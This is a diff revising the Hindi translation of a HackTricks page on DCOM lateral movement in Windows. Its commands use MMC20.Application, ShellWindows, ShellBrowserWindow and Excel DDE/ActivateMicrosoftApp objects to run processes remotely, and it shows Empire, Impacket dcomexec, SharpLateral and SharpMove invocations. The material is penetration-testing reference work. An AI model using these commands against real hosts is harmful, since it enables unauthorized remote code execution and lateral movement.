@@ -2,14 +2,14 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-DCOM lateral movement आकर्षक है क्योंकि यह नए service या scheduled task बनाने के बजाय RPC/DCOM के माध्यम से exposed मौजूदा COM servers का reuse करता है। व्यवहार में इसका मतलब है कि initial connection आमतौर पर TCP/135 पर शुरू होती है और फिर dynamically assigned high RPC ports पर move करती है।
+DCOM lateral movement आकर्षक है क्योंकि यह service या scheduled task बनाने के बजाय RPC/DCOM पर exposed मौजूदा COM servers का पुनः उपयोग करता है। व्यवहार में इसका अर्थ है कि initial connection आमतौर पर TCP/135 पर शुरू होता है और फिर dynamically assigned high RPC ports पर चला जाता है।
 
-## Prerequisites & Gotchas
+## Prerequisites और Gotchas
 
-- आमतौर पर आपको target पर local administrator context चाहिए और remote COM server को remote launch/activation allow करना चाहिए।
-- **March 14, 2023** के बाद से, Microsoft supported systems के लिए DCOM hardening enforce करता है। पुराने clients जो low activation authentication level request करते हैं, वे fail हो सकते हैं जब तक कि वे कम से कम `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` negotiate न करें। Modern Windows clients आमतौर पर auto-raised होते हैं, इसलिए current tooling सामान्यतः काम करता रहता है।
-- Manual या scripted DCOM execution के लिए आमतौर पर TCP/135 के साथ target का dynamic RPC port range भी चाहिए। अगर आप Impacket के `dcomexec.py` का उपयोग कर रहे हैं और command output वापस चाहते हैं, तो आमतौर पर `ADMIN$` (या किसी अन्य writable/readable share) पर SMB access भी चाहिए।
-- अगर RPC/DCOM काम करता है लेकिन SMB blocked है, तो `dcomexec.py -nooutput` फिर भी blind execution के लिए useful हो सकता है।
+- आमतौर पर target पर local administrator context आवश्यक होता है और remote COM server को remote launch/activation की अनुमति देनी चाहिए।
+- **March 14, 2023** से Microsoft supported systems के लिए DCOM hardening लागू करता है। पुराने clients, जो low activation authentication level का अनुरोध करते हैं, विफल हो सकते हैं जब तक कि वे कम से कम `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` पर negotiate न करें। Modern Windows clients आमतौर पर अपने-आप इसका स्तर बढ़ा देते हैं, इसलिए current tooling सामान्यतः काम करता रहता है।<sup>[[3]](#references)</sup>
+- Manual या scripted DCOM execution के लिए आमतौर पर TCP/135 और target की dynamic RPC port range आवश्यक होती है। यदि आप Impacket का `dcomexec.py` उपयोग कर रहे हैं और command output वापस चाहते हैं, तो आमतौर पर `ADMIN$` (या किसी अन्य writable/readable share) तक SMB access भी आवश्यक होता है।
+- यदि RPC/DCOM काम करता है लेकिन SMB blocked है, तो `dcomexec.py -nooutput` blind execution के लिए फिर भी उपयोगी हो सकता है।
 
 Quick checks:
 ```bash
@@ -21,21 +21,21 @@ Test-NetConnection -ComputerName 10.10.10.10 -Port 135
 ```
 ## MMC20.Application
 
-**इस technique के बारे में और जानकारी के लिए मूल post देखें [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**
+**इस technique के बारे में अधिक जानकारी के लिए [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) पर original post देखें।**<sup>[[1]](#references)</sup>
 
-Distributed Component Object Model (DCOM) objects नेटवर्क-आधारित interactions के लिए objects के साथ एक दिलचस्प capability प्रदान करते हैं। Microsoft DCOM और Component Object Model (COM) दोनों के लिए व्यापक documentation देता है, जो [यहाँ DCOM के लिए](https://msdn.microsoft.com/en-us/library/cc226801.aspx) और [यहाँ COM के लिए](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) उपलब्ध है। DCOM applications की एक list PowerShell command का उपयोग करके प्राप्त की जा सकती है:
+Distributed Component Object Model (DCOM) objects, objects के साथ network-based interactions के लिए एक उपयोगी capability प्रदान करते हैं। Microsoft, DCOM और Component Object Model (COM), दोनों के लिए व्यापक documentation उपलब्ध कराता है, जिसे [यहाँ DCOM के लिए](https://msdn.microsoft.com/en-us/library/cc226801.aspx) और [यहाँ COM के लिए](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) access किया जा सकता है। DCOM applications की list निम्नलिखित PowerShell command का उपयोग करके प्राप्त की जा सकती है:
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
-The COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC snap-in operations की scripting को सक्षम बनाता है। विशेष रूप से, इस object में `Document.ActiveView` के अंतर्गत एक `ExecuteShellCommand` method होता है। इस method के बारे में अधिक जानकारी [here](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) पर मिल सकती है। इसे चलाकर देखें:
+COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC snap-in operations की scripting सक्षम करता है। विशेष रूप से, इस object में `Document.ActiveView` के अंतर्गत एक `ExecuteShellCommand` method मौजूद है। इस method के बारे में अधिक जानकारी [यहाँ](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) मिल सकती है। इसे चलाकर जाँचें:
 
-यह feature एक DCOM application के माध्यम से network पर commands execute करने की सुविधा देता है। DCOM के साथ remotely एक admin के रूप में interact करने के लिए, PowerShell का उपयोग इस प्रकार किया जा सकता है:
+यह feature DCOM application के माध्यम से network पर commands execute करने की सुविधा देता है। DCOM के साथ remotely admin के रूप में interact करने के लिए PowerShell का उपयोग इस प्रकार किया जा सकता है:
 ```bash
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
-यह कमांड DCOM application से connect करती है और COM object का एक instance return करती है। फिर ExecuteShellCommand method को invoke करके remote host पर एक process execute किया जा सकता है। इस process में निम्न steps शामिल हैं:
+यह command DCOM application से connect करता है और COM object का एक instance return करता है। इसके बाद remote host पर process execute करने के लिए ExecuteShellCommand method को invoke किया जा सकता है। इस process में निम्नलिखित steps शामिल हैं:
 
-Check methods:
+Methods जांचें:
 ```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
@@ -50,21 +50,21 @@ $null,
 "7"
 )
 ```
-अंतिम argument window style है। `7` window को minimized रखता है। Operationally, MMC-based execution आमतौर पर remote `mmc.exe` process को spawn कराती है, जो नीचे दिए गए Explorer-backed objects से अलग है।
+अंतिम argument window style है। `7` window को minimized रखता है। Operational रूप से, MMC-based execution में आमतौर पर remote `mmc.exe` process आपके payload को spawn करता है, जो नीचे दिए गए Explorer-backed objects से अलग है।
 
 ## ShellWindows & ShellBrowserWindow
 
-**इस technique के बारे में और जानकारी के लिए original post देखें [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
+**इस technique के बारे में अधिक जानकारी के लिए original post देखें [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>
 
-**MMC20.Application** object में explicit "LaunchPermissions" की कमी पाई गई थी, और यह default permissions पर गिरता है जो Administrators access को allow करती हैं। अधिक विवरण के लिए, thread [here](https://twitter.com/tiraniddo/status/817532039771525120) देखा जा सकता है, और explicit Launch Permission के बिना objects को filter करने के लिए [@tiraniddo](https://twitter.com/tiraniddo) के OleView .NET के उपयोग की सिफारिश की जाती है।
+**MMC20.Application** object में explicit "LaunchPermissions" नहीं पाए गए, और यह default रूप से ऐसी permissions पर निर्भर करता है जो Administrators को access की अनुमति देती हैं। अधिक जानकारी के लिए [यह thread](https://twitter.com/tiraniddo/status/817532039771525120) देखा जा सकता है। Explicit Launch Permission के बिना objects को filter करने के लिए [@tiraniddo](https://twitter.com/tiraniddo) के OleView .NET के उपयोग की recommendation की जाती है।
 
-दो specific objects, `ShellBrowserWindow` और `ShellWindows`, को उनकी explicit Launch Permissions की कमी के कारण highlight किया गया था। `HKCR:\AppID\{guid}` के तहत `LaunchPermission` registry entry का न होना explicit permissions के अभाव को दर्शाता है।
+दो specific objects, `ShellBrowserWindow` और `ShellWindows`, को उनकी explicit Launch Permissions की अनुपस्थिति के कारण highlight किया गया। `HKCR:\AppID\{guid}` के अंतर्गत `LaunchPermission` registry entry का न होना explicit permissions की अनुपस्थिति को दर्शाता है।
 
-`MMC20.Application` की तुलना में, ये objects अक्सर OPSEC perspective से अधिक quiet होते हैं क्योंकि command आमतौर पर remote host पर `mmc.exe` के बजाय `explorer.exe` के child के रूप में end होती है।
+`MMC20.Application` की तुलना में, ये objects OPSEC के दृष्टिकोण से अक्सर अधिक quiet होते हैं, क्योंकि remote host पर command आमतौर पर `mmc.exe` के बजाय `explorer.exe` की child process बन जाती है।
 
 ### ShellWindows
 
-`ShellWindows` के लिए, जिसमें ProgID नहीं है, .NET methods `Type.GetTypeFromCLSID` और `Activator.CreateInstance` इसके AppID का उपयोग करके object instantiation को आसान बनाते हैं। यह process `ShellWindows` के CLSID को retrieve करने के लिए OleView .NET का leverage करती है। एक बार instantiate हो जाने पर, `WindowsShell.Item` method के माध्यम से interaction संभव है, जिससे `Document.Application.ShellExecute` जैसी method invocation होती है।
+`ShellWindows` में ProgID नहीं है। .NET methods `Type.GetTypeFromCLSID` और `Activator.CreateInstance`, इसके AppID का उपयोग करके object instantiation को facilitate करते हैं। यह process `ShellWindows` का CLSID प्राप्त करने के लिए OleView .NET का उपयोग करता है। Instantiation के बाद, `WindowsShell.Item` method के माध्यम से interaction संभव है, जिससे `Document.Application.ShellExecute` जैसे method invocation किए जा सकते हैं।
 
 Object को instantiate करने और remotely commands execute करने के लिए example PowerShell commands दिए गए थे:
 ```bash
@@ -76,7 +76,7 @@ $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\sy
 ```
 ### ShellBrowserWindow
 
-`ShellBrowserWindow` समान है, लेकिन आप इसे सीधे इसके CLSID के जरिए instantiate कर सकते हैं और `Document.Application.ShellExecute` पर pivot कर सकते हैं:
+`ShellBrowserWindow` समान है, लेकिन आप इसे सीधे इसके CLSID के माध्यम से instantiate कर सकते हैं और `Document.Application.ShellExecute` पर pivot कर सकते हैं:
 ```bash
 $com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
 $obj = [System.Activator]::CreateInstance($com)
@@ -90,9 +90,9 @@ $null,
 ```
 ### Excel DCOM Objects के साथ Lateral Movement
 
-DCOM Excel objects का exploit करके lateral movement हासिल किया जा सकता है। अधिक जानकारी के लिए, [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) पर DCOM के जरिए lateral movement के लिए Excel DDE को leverage करने पर चर्चा पढ़ना बेहतर होगा।
+DCOM Excel objects का exploit करके Lateral Movement हासिल किया जा सकता है। विस्तृत जानकारी के लिए, DCOM के माध्यम से Lateral Movement हेतु Excel DDE का उपयोग करने पर [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) में दी गई चर्चा पढ़ना उचित है।<sup>[[5]](#references)</sup>
 
-Empire project एक PowerShell script प्रदान करता है, जो DCOM objects को manipulate करके remote code execution (RCE) के लिए Excel के उपयोग को दिखाता है। नीचे [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) में उपलब्ध script से snippets दिए गए हैं, जो RCE के लिए Excel को abuse करने के अलग-अलग तरीकों को दिखाते हैं:
+Empire project एक PowerShell script प्रदान करता है, जो DCOM objects में हेरफेर करके remote code execution (RCE) के लिए Excel के उपयोग को प्रदर्शित करती है। नीचे [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) पर उपलब्ध script के snippets दिए गए हैं, जो RCE के लिए Excel का दुरुपयोग करने के विभिन्न तरीकों को दिखाते हैं:
 ```bash
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
@@ -115,26 +115,26 @@ $Obj.DisplayAlerts = $false
 $Obj.DDEInitiate("cmd", "/c $Command")
 }
 ```
-हालिया शोध ने इस क्षेत्र को `Excel.Application` की `ActivateMicrosoftApp()` method के साथ विस्तारित किया। मुख्य विचार यह है कि Excel system `PATH` में खोज करके FoxPro, Schedule Plus, या Project जैसी legacy Microsoft applications को launch करने की कोशिश कर सकता है। अगर operator target के `PATH` का हिस्सा किसी writable location में उन अपेक्षित names में से एक के साथ payload रख सके, तो Excel उसे execute करेगा।
+हालिया research ने इस क्षेत्र को `Excel.Application` की `ActivateMicrosoftApp()` method के साथ और विस्तृत किया है। मुख्य विचार यह है कि Excel, system `PATH` में search करके FoxPro, Schedule Plus या Project जैसे legacy Microsoft applications को launch करने का प्रयास कर सकता है। यदि कोई operator target के `PATH` में शामिल किसी writable location में उन expected names में से किसी एक नाम वाला payload रख सकता है, तो Excel उसे execute करेगा।<sup>[[4]](#references)</sup>
 
 इस variation के लिए requirements:
 
-- target पर Local admin
-- target पर Excel installed
-- target के `PATH` में किसी writable directory में payload लिखने की ability
+- Target पर Local admin
+- Target पर Excel installed
+- Target के `PATH` में मौजूद किसी writable directory में payload लिखने की ability
 
-FoxPro lookup (`FOXPROW.exe`) का practical example:
+FoxPro lookup (`FOXPROW.exe`) का abuse करने वाला practical example:
 ```bash
 copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
 $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
 $com.ActivateMicrosoftApp("5")
 ```
-यदि attacking host पर local `Excel.Application` ProgID registered नहीं है, तो remote object को CLSID द्वारा instantiate करें:
+यदि attacking host पर local `Excel.Application` ProgID registered नहीं है, तो इसके बजाय CLSID का उपयोग करके remote object को instantiate करें:
 ```bash
 $com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
 $com.Application.ActivateMicrosoftApp("5")
 ```
-व्यवहार में दुरुपयोग किए गए मान:
+व्यवहार में abuse किए गए Values:
 
 - `5` -> `FOXPROW.exe`
 - `6` -> `WINPROJ.exe`
@@ -144,9 +144,9 @@ $com.Application.ActivateMicrosoftApp("5")
 
 इन techniques को automate करने के लिए दो tools को highlight किया गया है:
 
-- **Invoke-DCOM.ps1**: Empire project द्वारा दिया गया एक PowerShell script, जो remote machines पर code execute करने के लिए different methods के invocation को सरल बनाता है। यह script Empire GitHub repository पर उपलब्ध है।
+- **Invoke-DCOM.ps1**: Empire project द्वारा प्रदान की गई एक PowerShell script, जो remote machines पर code execute करने के लिए विभिन्न methods के invocation को सरल बनाती है। यह script Empire GitHub repository पर उपलब्ध है।
 
-- **SharpLateral**: remote code execute करने के लिए designed एक tool, जिसे इस command के साथ इस्तेमाल किया जा सकता है:
+- **SharpLateral**: एक tool जिसे remote रूप से code execute करने के लिए design किया गया है और जिसे इस command के साथ उपयोग किया जा सकता है:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
@@ -156,8 +156,8 @@ SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\tem
 ```
 ## Automatic Tools
 
-- Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) से अन्य मशीनों पर code execute करने के सभी commented तरीकों को आसानी से invoke किया जा सकता है।
-- आप Impacket के `dcomexec.py` का उपयोग करके DCOM के माध्यम से remote systems पर commands execute कर सकते हैं। Current builds `ShellWindows`, `ShellBrowserWindow`, और `MMC20` support करते हैं, और default रूप से `ShellWindows` इस्तेमाल करते हैं।
+- Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) अन्य machines में code execute करने के सभी commented तरीकों को आसानी से invoke करने की अनुमति देती है।
+- DCOM का उपयोग करके remote systems पर commands execute करने के लिए Impacket के `dcomexec.py` का उपयोग कर सकते हैं। Current builds `ShellWindows`, `ShellBrowserWindow` और `MMC20` को support करते हैं, और default रूप से `ShellWindows` का उपयोग करते हैं।
 ```bash
 dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"
 
@@ -175,11 +175,12 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```bash
 SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
 ```
-## संदर्भ
+## References
 
-- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
-- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
-- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
-- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
+- [1] [MMC20.Application COM Object का उपयोग करके Lateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
+- [2] [DCOM के माध्यम से Lateral Movement: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
+- [3] [KB5004442—Windows DCOM Server Security Feature Bypass (CVE-2021-26414) के लिए परिवर्तनों को Manage करें](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
+- [4] [Lateral Movement: DCOM Excel Application की शक्ति का Abuse](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
+- [5] [DCOM के माध्यम से Lateral Movement के लिए Excel DDE का Leveraging](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
 
 {{#include ../../banners/hacktricks-training.md}}
